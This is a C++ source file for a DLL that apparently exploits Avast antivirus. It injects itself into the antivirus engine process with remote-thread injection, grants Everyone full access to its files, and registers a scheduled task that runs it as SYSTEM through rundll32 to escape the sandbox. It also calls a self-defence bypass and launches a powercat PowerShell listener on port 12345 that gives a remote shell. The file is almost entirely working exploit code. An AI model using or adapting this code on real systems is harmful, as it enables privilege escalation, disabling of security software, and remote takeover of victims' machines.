// SandboxScheduleSystemAmPplProcessExploit.cpp : Defines the exported functions for the DLL.
//

#include <Windows.h>
#include "SandboxScheduleSystemAmPplProcessExploit.h"
#include "detours.h"
#include "CreateRemoteThread.h"
#include "OP_VAE_WPM.h"
#include "wil/stl.h"
#include "wil/win32_helpers.h"
#include <tlhelp32.h>
#include <aclapi.h>
#include <comdef.h>
#include <taskschd.h>
#include <string>
#include <stdexcept>
#include <filesystem>

namespace fs = std::filesystem;

EntryPointType g_originalEntryPoint;

namespace
{
    // ToDo: Move to process_helpers.cpp
    DWORD GetProcessIdByName(const wchar_t *processName)
    {
        DWORD processId = 0;

        HANDLE hProcessSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hProcessSnapshot == INVALID_HANDLE_VALUE)
            throw std::runtime_error("CreateToolhelp32Snapshot failed. Error: " + std::to_string(::GetLastError()));

        auto closeProcessSnapshotOnExit = wil::scope_exit([hProcessSnapshot] { ::CloseHandle(hProcessSnapshot); });

        PROCESSENTRY32 processEntry = {};
        processEntry.dwSize = sizeof(PROCESSENTRY32);

        if (!::Process32First(hProcessSnapshot, &processEntry))
            throw std::runtime_error("Process32First failed. Error: " + std::to_string(::GetLastError()));

        do
        {
            if (::_wcsicmp(processEntry.szExeFile, processName) == 0)
            {
                processId = processEntry.th32ProcessID;
                break;
            }
        } while (::Process32Next(hProcessSnapshot, &processEntry));

        return processId;
    }

    // ToDo: Move to security_helpers.cpp
    PACL CreateEveryoneFullAccessInheritableAcl()
    {
        // Create a SID for the Everyone group
        SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
        PSID pSIDEveryone;

        if (!::AllocateAndInitializeSid(
            &SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone))
            throw std::runtime_error("AllocateAndInitializeSid failed. Error: " + std::to_string(::GetLastError()));
        auto freeEveryoneSid = wil::scope_exit([pSIDEveryone] { ::FreeSid(pSIDEveryone); });

        EXPLICIT_ACCESS ea[1];
        ZeroMemory(&ea, sizeof(ea));

        // Set full control for Everyone
        ea[0].grfAccessPermissions = GENERIC_ALL;
        ea[0].grfAccessMode = SET_ACCESS;
        ea[0].grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
        ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
        ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
        ea[0].Trustee.ptstrName = reinterpret_cast<LPTSTR>(pSIDEveryone);

        PACL pACL;
        if (::SetEntriesInAcl(_countof(ea), ea, NULL, &pACL) != ERROR_SUCCESS)
            throw std::runtime_error("SetEntriesInAcl failed. Error: " + std::to_string(::GetLastError()));

        return pACL;
    }

    void MakeFileEveryoneAccessible(const wchar_t *filePath)
    {
        auto pACL = CreateEveryoneFullAccessInheritableAcl();
        auto freeACLOnExit = wil::scope_exit([pACL] { ::LocalFree(pACL); });

        auto returnValue = ::SetNamedSecurityInfo(
            const_cast<LPTSTR>(filePath), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);
        if (returnValue != ERROR_SUCCESS)
            throw std::runtime_error("SetNamedSecurityInfo failed. Error: " + std::to_string(returnValue));
    }

    void InjectDllIntoProcess(const wchar_t *dllPath, const wchar_t *processName)
    {
        MakeFileEveryoneAccessible(dllPath);

        auto processId = GetProcessIdByName(processName);
        if (!processId)
            throw std::runtime_error("Cannot find process id with specified name");

        auto executor = std::make_unique<CodeViaCreateRemoteThread>(
            new OpenProcess_VirtualAllocEx_WriteProcessMemory(
                reinterpret_cast<void *>(const_cast<wchar_t *>(dllPath)),
                ::wcslen(dllPath) * sizeof(wchar_t),
                PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE),
            LoadLibraryW);

        if (executor->inject(processId, 0) != 0)
            throw std::runtime_error("inject failed");
    }

    constexpr auto EveryoneFullAccessSddl = L"D:(A;OICI;FA;;;WD)";

    void ScheduleTaskStartExecutableAsSystem(
        const std::wstring &taskName, const std::wstring &executablePath, const std::wstring &arguments)
    {
        HRESULT hr = ::CoInitializeEx(nullptr, COINIT_MULTITHREADED);
        if (FAILED(hr))
            throw std::runtime_error("CoInitializeEx failed. Error: " + std::to_string(hr));
        auto coUninitializeOnExit = wil::scope_exit([] { ::CoUninitialize(); });

        hr = ::CoInitializeSecurity(
            nullptr, -1, nullptr, nullptr, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, 0, nullptr);
        if (FAILED(hr))
            throw std::runtime_error("CoInitializeSecurity failed. Error: " + std::to_string(hr));

        ITaskService *pTaskService;
        hr = ::CoCreateInstance(
            CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER, IID_ITaskService, reinterpret_cast<LPVOID *>(&pTaskService));
        if (FAILED(hr))
            throw std::runtime_error("CoCreateInstance failed. Error: " + std::to_string(hr));
        auto releaseTaskServiceOnExit = wil::scope_exit([pTaskService] { pTaskService->Release(); });

        hr = pTaskService->Connect({}, {}, {}, {});
        if (FAILED(hr))
            throw std::runtime_error("ITaskService::Connect failed. Error: " + std::to_string(hr));

        ITaskFolder *pRootFolder;
        hr = pTaskService->GetFolder(_bstr_t(LR"(\)"), &pRootFolder);
        if (FAILED(hr))
            throw std::runtime_error("ITaskService::GetFolder failed. Error: " + std::to_string(hr));
        auto releaseRootFolderOnExit = wil::scope_exit([pRootFolder] { pRootFolder->Release(); });

        static_cast<void>(pRootFolder->DeleteTask(_bstr_t(taskName.c_str()), 0));

        ITaskDefinition *pTaskDefinition;
        hr = pTaskService->NewTask(0, &pTaskDefinition);
        releaseTaskServiceOnExit.reset();
        if (FAILED(hr))
            throw std::runtime_error("ITaskService::NewTask failed. Error: " + std::to_string(hr));
        auto releaseTaskDefinitionOnExit = wil::scope_exit([pTaskDefinition] { pTaskDefinition->Release(); });

        IPrincipal *pPrincipal;
        hr = pTaskDefinition->get_Principal(&pPrincipal);
        if (FAILED(hr))
            throw std::runtime_error("ITaskDefinition::get_Principal failed. Error: " + std::to_string(hr));
        auto releasePrincipalOnExit = wil::scope_exit([pPrincipal] { pPrincipal->Release(); });

        hr = pPrincipal->put_LogonType(TASK_LOGON_SERVICE_ACCOUNT);
        if (FAILED(hr))
            throw std::runtime_error("IPrincipal::put_LogonType failed. Error: " + std::to_string(hr));

        hr = pPrincipal->put_UserId(bstr_t(L"SYSTEM"));
        releasePrincipalOnExit.reset();
        if (FAILED(hr))
            throw std::runtime_error("IPrincipal::put_UserId failed. Error: " + std::to_string(hr));

        ITriggerCollection *pTriggerCollection;
        hr = pTaskDefinition->get_Triggers(&pTriggerCollection);
        if (FAILED(hr))
            throw std::runtime_error("ITaskDefinition::get_Triggers failed. Error: " + std::to_string(hr));
        auto releaseTriggerCollectionOnExit = wil::scope_exit([pTriggerCollection] { pTriggerCollection->Release(); });

        ITrigger *pTrigger;
        hr = pTriggerCollection->Create(TASK_TRIGGER_TIME, &pTrigger);
        releaseTriggerCollectionOnExit.reset();
        if (FAILED(hr))
            throw std::runtime_error("ITriggerCollection::Create failed. Error: " + std::to_string(hr));
        auto releaseTriggerOnExit = wil::scope_exit([pTrigger] { pTrigger->Release(); });

        ITimeTrigger *pTimeTrigger;
        hr = pTrigger->QueryInterface(IID_ITimeTrigger, reinterpret_cast<LPVOID *>(&pTimeTrigger));
        releaseTriggerOnExit.reset();
        if (FAILED(hr))
            throw std::runtime_error("ITrigger::QueryInterface(IID_ITimeTrigger) failed. Error: " + std::to_string(hr));
        auto releaseTimeTriggerOnExit = wil::scope_exit([pTimeTrigger] { pTimeTrigger->Release(); });

        hr = pTimeTrigger->put_Id(_bstr_t(L"Trigger1"));
        if (FAILED(hr))
            std::cerr << "ITimeTrigger::put_Id failed. Error: 0x" << std::hex << hr << std::endl;

        hr = pTimeTrigger->put_StartBoundary(_bstr_t(L"2020-03-22T08:55:00"));
        releaseTimeTriggerOnExit.reset();
        if (FAILED(hr))
            throw std::runtime_error("ITimeTrigger::put_StartBoundary failed. Error: " + std::to_string(hr));

        IActionCollection *pActionCollection;
        hr = pTaskDefinition->get_Actions(&pActionCollection);
        if (FAILED(hr))
            throw std::runtime_error("ITaskDefinition::get_Actions failed. Error: " + std::to_string(hr));
        auto releaseActionCollectionOnExit = wil::scope_exit([pActionCollection] { pActionCollection->Release(); });

        IAction *pAction;
        hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
        releaseActionCollectionOnExit.reset();
        if (FAILED(hr))
            throw std::runtime_error("IActionCollection::Create failed. Error: " + std::to_string(hr));
        auto releaseActionOnExit = wil::scope_exit([pAction] { pAction->Release(); });

        IExecAction *pExecAction;
        hr = pAction->QueryInterface(IID_IExecAction, reinterpret_cast<LPVOID *>(&pExecAction));
        releaseActionOnExit.reset();
        if (FAILED(hr))
            throw std::runtime_error("IAction::QueryInterface(IID_IExecAction) failed. Error: " + std::to_string(hr));
        auto releaseExecActionOnExit = wil::scope_exit([pExecAction] { pExecAction->Release(); });

        hr = pExecAction->put_Path(_bstr_t(executablePath.c_str()));
        if (FAILED(hr))
            throw std::runtime_error("IExecAction::put_Path failed. Error: " + std::to_string(hr));

        hr = pExecAction->put_Arguments(_bstr_t(arguments.c_str()));
        releaseExecActionOnExit.reset();
        if (FAILED(hr))
            throw std::runtime_error("IExecAction::put_Arguments failed. Error: " + std::to_string(hr));

        IRegisteredTask *pRegisteredTask;
        hr = pRootFolder->RegisterTaskDefinition(
            _bstr_t(taskName.c_str()), pTaskDefinition, TASK_CREATE_OR_UPDATE, {}, {}, TASK_LOGON_SERVICE_ACCOUNT, _variant_t(EveryoneFullAccessSddl), &pRegisteredTask);
        if (FAILED(hr))
            throw std::runtime_error("ITaskFolder::RegisterTaskDefinition failed. Error: " + std::to_string(hr));
        auto releaseRegisteredTaskOnExit = wil::scope_exit([pRegisteredTask] { pRegisteredTask->Release(); });

        IRunningTask *pRunningTask;
        hr = pRegisteredTask->Run({}, &pRunningTask);
        if (FAILED(hr))
            throw std::runtime_error("IRegisteredTask::RunEx failed. Error: " + std::to_string(hr));
        auto releaseRunningTaskOnExit = wil::scope_exit([pRunningTask] { pRunningTask->Release(); });
    }
} // anonymous namespace

void CALLBACK Exploit(HWND, HINSTANCE, PCSTR, INT)
{
    try
    {
        BypassSelfDefense();
    }
    catch (const std::exception &e)
    {
        // ToDo: Log error
        UNREFERENCED_PARAMETER(e);
        __debugbreak();
    }
}

int APIENTRY EscalatePrivileges()
{
    try
    {
        auto thisModuleBaseAddress =
            DetourGetContainingModule(DetourCodeFromPointer(EscalatePrivileges, nullptr));
        if (!thisModuleBaseAddress)
            throw std::runtime_error("DetourGetContainingModule failed");

        const auto thisModulePath =
            fs::path(wil::GetModuleFileNameW<std::wstring>(thisModuleBaseAddress));

        InjectDllIntoProcess(
            thisModulePath.c_str(), fs::path(AswEngSrvExeFilePath).filename().c_str());
    }
    catch (const std::exception &e)
    {
        // ToDo: Log error
        UNREFERENCED_PARAMETER(e);
        __debugbreak();
    }

    return /*g_originalEntryPoint()*/0;
}

int APIENTRY EscapeSandbox()
{
    try
    {
        constexpr auto exploitTaskName = L"AvastEscapeSandbox";

        auto thisModuleBaseAddress =
            DetourGetContainingModule(DetourCodeFromPointer(EscapeSandbox, nullptr));
        if (!thisModuleBaseAddress)
            throw std::runtime_error("DetourGetContainingModule failed");

        const auto thisModulePath =
            fs::path(wil::GetModuleFileNameW<std::wstring>(thisModuleBaseAddress));

        ScheduleTaskStartExecutableAsSystem(
            exploitTaskName, LR"(C:\Windows\System32\rundll32.exe)", std::wstring(LR"(")") + thisModulePath.c_str()+ LR"(")" + L",ExecutePayload");
    }
    catch (const std::exception &e)
    {
        // ToDo: Log error
        UNREFERENCED_PARAMETER(e);
        __debugbreak();
    }

    return /*g_originalEntryPoint()*/0;
}

void CALLBACK ExecutePayload(HWND, HINSTANCE, PCSTR, INT)
{
    try
    {
        auto thisModuleBaseAddress =
            DetourGetContainingModule(DetourCodeFromPointer(ExecutePayload, nullptr));
        if (!thisModuleBaseAddress)
            throw std::runtime_error("DetourGetContainingModule failed");

        const auto thisModulePath =
            fs::path(wil::GetModuleFileNameW<std::wstring>(thisModuleBaseAddress));
        auto thisModuleParentDirectoryPath = thisModulePath.parent_path();
        const auto powerShdllPath = std::move(thisModuleParentDirectoryPath) / "PowerShdll.dll";

        auto powerShdllHandle = wil::unique_hmodule(::LoadLibrary(powerShdllPath.c_str()));
        if (!powerShdllHandle)
            throw std::runtime_error("LoadLibrary failed. Error: " + std::to_string(::GetLastError()));

        using Rundll32ExportFunctionType = void (CALLBACK *)(HWND, HINSTANCE, PCSTR, INT);

        auto pMain = reinterpret_cast<Rundll32ExportFunctionType>(::GetProcAddress(powerShdllHandle.get(), "main"));
        if (!pMain)
            throw std::runtime_error("GetProcAddress failed. Error: " + std::to_string(::GetLastError()));

        auto commandLine = std::string(". ") + (thisModuleParentDirectoryPath / "powercat.ps1").string() + ";powercat -l -p 12345 -ep";
        pMain(0, 0, commandLine.c_str(), 0);
    }
    catch (const std::exception &e)
    {
        // ToDo: Log error
        UNREFERENCED_PARAMETER(e);
        __debugbreak();
    }
}
